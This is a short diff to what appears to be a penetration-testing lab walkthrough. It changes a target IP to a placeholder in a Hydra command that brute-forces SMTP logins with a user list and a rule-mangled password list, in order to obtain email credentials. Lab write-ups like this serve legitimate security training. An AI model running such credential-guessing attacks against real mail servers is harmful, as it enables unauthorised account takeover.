@@ -46,7 +46,7 @@ john --wordlist=password_base_list.txt --rules=Capstone --stdout > mangled-passw
 Getting some email's credentials.
 
 ```
-hydra -L users.txt -P mangled-passwords.txt smtp://10.200.103.11 -V -o smtp-results.txt
+hydra -L users.txt -P mangled-passwords.txt smtp://10.200.X.11 -V -o smtp-results.txt
 
 cat smtp-results.txt
 ```
